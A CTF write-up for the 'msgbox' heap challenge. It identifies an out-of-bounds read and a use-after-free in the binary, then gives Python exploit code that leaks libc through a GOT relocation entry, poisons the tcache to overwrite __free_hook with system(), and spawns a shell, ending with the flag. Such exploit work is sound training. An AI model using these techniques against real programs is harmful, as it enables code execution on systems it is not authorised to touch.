# msgbox

More secure than "Whatsapp"  😉

`nc 157.230.33.195 2222 `

Flag format : Trollcat{}

**Author : codacker**

**Files**: `msgbox.zip` (`vuln`, `vuln.c`, `libc.so.6`)

```sh
$ checksec msgbox.o # renamed vuln
[*] 'msgbox.o'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ../libc-database/identify msgbox.so.6 # renamed libc.so.6
libc6_2.27-3ubuntu1.4_amd64
```

I use [pwnscripts](https://github.com/152334H/pwnscripts) to finish libc challenges quickly.

## Code parsing

`strings[]` is an array of _strings_ (`char*`) that starts off empty. `sizes[]` is an array keeping track of the lengths of each string. Both are `0x10` large.

### `add()`

* user-provided index; assert on boundaries
* `strings[i] = malloc(<user provided size>)`
* `read(size-1)` to take in input
* `size[i] = size`

### `show()`

* takes user-provided index, **no bounds checking**
* uses `%s` with `printf()`, so possible overprinting due to lack of nul-terminator

### `delete()`

* user-provided index; assert on boundaries
* `free(strings[idx])`. No zeroing out of `strings[idx]`/`sizes[idx]`; **clear UAF / double-free**

### `edit()`

* user-provided index; assert on boundaries
* `read(0, strings[idx], sizes[idx])`. Note that this is 1 larger than what `add()` originally does.

I also prepared a python framework to deal with this challenge:

```python
from pwnscripts import *
context.binary = 'msgbox.o'
context.libc_database = '../libc-database'
context.libc = 'msgbox.so.6'
r = remote('157.230.33.195', 2222)

def add(size: int, idx: int, msg: bytes):
    r.sendlineafter('> ', '1')
    r.sendlineafter('size: ', str(size))
    r.sendlineafter('idx: ', str(idx))
    r.sendafter('message: ', msg)
def show(idx: int):
    r.sendlineafter('> ', '2')
    r.sendlineafter('idx: ', str(idx))
    return r.recvline()
def delete(idx: int):
    r.sendlineafter('> ', '3')
    r.sendlineafter('idx: ', str(idx))
def edit(idx: int, msg: bytes):
    r.sendlineafter('> ', '4')
    r.sendlineafter('idx: ', str(idx))
    r.sendafter('message: ', msg)
```

With that out of the way, what're we going to do?

## how2heap

This challenge doesn't have a single fixed solution; there are _many_ heap-based vulnerabilities present in the source code, and I'll only be using two to get through:

### Arbitrary Relative Dereference

`show()` is the only function that happens to lack bounds checking (i.e. asserting `0<=idx<0x10`), and we can abuse it for an arbitrary read.

Because `show(idx)` will essentially commit `printf("%s", strings[idx])`, we can read any pointer located around the `0x400000-0x600000+` range (so long as it is _actually_ a pointer). Since leaking libc is usually important for a heap challenge, I decided to try finding a _pointer_^1^ to a libc location in the binary.

A quick scan in gdb-gef led to results:

`0x0000000000400580│+0x0580: 0x0000000000601ff0  →  0x00007fffff0801f0  →  <__libc_start_main+0> push r14`

This corresponds with this section in IDA:

`LOAD:0000000000400580                 Elf64_Rela <601FF0h, 800000006h, 0> ; R_X86_64_GLOB_DAT __libc_start_main`

This means that `strings[(0x400580-(int)strings)/8]` will be a pointer to libc, and we'll get the libc base with a simple one-liner:

```python
context.libc.symbols['__libc_start_main'] = unpack_bytes(show((0x400580-context.binary.symbols['strings'])//8).split(b'] ')[-1], 6)
```

With libc leaked, all we need to do is to overwrite `__free_hook` to gain arbitrary code execution.

### Use-After-Free

In `delete()`, `strings[idx]` is `free()`d without setting `strings[idx] = 0`. This is dangerous for multiple reasons, but one of the easier things we can do here is to run `edit(idx, writeable_location)` _after_ `delete(idx)`:

```python
SZ = 0x18
add(SZ, 0, b'garbage')
delete(0)
edit(0, pack(context.libc.symbols['__free_hook']))
```

 After `delete(0)`, the tcache free list will contain a single saved pointer. `edit()`ing the deleted pointer will add an extra pointer to the free list; I'm editing the string to contain `__free_hook` so that the _next_ allocation will point towards there:

```python
add(SZ, 0, b'/bin/sh;') # this is the original add()'d pointer
add(SZ, 1, pack(context.libc.symbols['system'])) # this allocation is given __free_hook; I overwrite it with system()
delete(0) # __free_hook causes system("/bin/sh")
```

That's it.

## Flag

`Trollcat{h34p_h34p_g0_4w4y}`

1. Note the level of dereferencing here. The GOT table is a list of functions; using `show()` to display pointers on the GOT table would only result in "leaking" assembly code.
